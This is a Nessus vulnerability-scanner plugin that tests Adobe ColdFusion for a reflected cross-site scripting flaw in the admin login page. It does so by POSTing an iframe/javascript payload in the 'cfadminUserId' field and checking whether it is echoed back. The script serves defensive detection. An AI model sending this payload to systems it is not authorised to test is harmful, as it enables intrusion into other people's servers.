#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(46705);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2017/05/11 13:46:37 $");

  script_cve_id("CVE-2010-1293");
  script_bugtraq_id(40073);
  script_osvdb_id(64658);
  script_xref(name:"Secunia", value:"39790");

  script_name(english:"Adobe ColdFusion 'cfadminUserId' XSS (APSB10-11)");
  script_summary(english:"Attempts a non-persistent xss.");

  script_set_attribute(attribute:"synopsis", value:
"A web application running on the remote host is affected by a
cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Adobe ColdFusion running on the remote host is affected
by a cross-site scripting vulnerability in the administrative web
interface. Input to the 'cfadminUserId' parameter of
'/CFIDE/administrator/login.cfm' is not properly sanitized. This
vulnerability is present when the 'Separate user name and password
authentication' configuration setting is enabled.

This version of ColdFusion is reportedly affected by additional
vulnerabilities, although Nessus has not checked for those issues.");
  script_set_attribute(attribute:"see_also", value:"http://www.adobe.com/support/security/bulletins/apsb10-11.html");
  script_set_attribute(attribute:"solution", value:"Apply the hotfix referenced in Adobe's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/05/11");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/05/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/05/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adobe:coldfusion");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");

  script_dependencies("coldfusion_detect.nasl");
  script_require_ports("Services/www", 80, 8500);
  script_require_keys("installed_sw/ColdFusion");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = 'ColdFusion';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

url = dir + '/administrator/login.cfm';

xss = '"><iframe src="javascript:alert(\''+SCRIPT_NAME+'-'+unixtime()+'\')';
expected_output = 'value="'+xss;
data = 'cfadminUserId='+xss;

res = http_send_recv3(
  method : "POST",
  port   : port,
  item   : url,
  data   : data,
  content_type : 'application/x-www-form-urlencoded',
  exit_on_fail : TRUE
);

if (expected_output >< res[2])
{
  output = strstr(res[2], expected_output);
  if (empty_or_null(output)) output = res[2];

  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    generic    : TRUE,
    line_limit : 5,
    xss        : TRUE,
    request    : make_list(http_last_sent_request()),
    output     : chomp(output)
  );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
